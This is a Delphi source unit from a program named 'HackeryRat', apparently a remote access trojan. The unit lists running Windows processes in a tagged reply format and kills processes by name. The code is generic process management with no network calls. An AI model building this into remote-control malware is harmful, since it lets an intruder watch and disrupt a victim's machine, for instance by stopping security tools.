{************************************************************
 *          HackeryRat - Criado por Haeckel Nogueira        *
 *                                                          *
 * PROIBIDA A ALTERAÇÃO OU CÓPIA DO SOURCE SEM AUTORIZAÇÃO! *
 *                                                          *
 *                 Autor: Haeckel Nogueira                  *
 *             Email: haeckelnogueira@hotmail.com           *
 ************************************************************}

unit Processes;

interface

uses Tlhelp32,Windows;

 Function ListProcesses:String;
 Function KillProcess(ProcName:string):integer;

implementation

uses SysUtils;
{ LISTAR PROCESSOS }
 Function  ListProcesses:String;
 Var
  Handle:THandle;
  ProcShot:TProcessEntry32;
  Str:string;
  i:Integer;
  Loop:bool;
 begin
 str:='';
 i:=0;
 Handle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 ProcShot.dwSize:=sizeof(ProcShot);
 loop:=Process32First(Handle,ProcShot);
 while integer(loop) <> 0 do
 begin
 Str:=Str+ProcShot.szExeFile+'|';
 i:=i+1;
 Loop:=Process32Next(Handle,ProcShot);
 end;
 CloseHandle(Handle);
 Result:=('<LISTPROC>' + IntToStr(i)+'|'+Str);
 end;

 { FECHAR PROCESSO }
 Function KillProcess(ProcName:string):integer;
 Const Treminate_proc = $0001;
 var
  Loop:bool;
  Handle:THandle;
  procShot:TProcessEntry32;
 begin
 Result:=0;
 Handle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 procShot.dwSize:=sizeof(procShot);
 loop:=Process32First(Handle,procShot);
 while integer(loop) <> 0 do
 begin
 if ((UpperCase(ExtractFileName(procShot.szExeFile)) = UpperCase(ProcName))or (UpperCase(procShot.szExeFile)= UpperCase(ProcName)))then
  Result:=integer(TerminateProcess(OpenProcess(Treminate_proc,bool(0),procShot.th32ProcessID),0));
 Loop:=Process32Next(Handle,procShot);
 end;
 CloseHandle(Handle);
 end;
end.
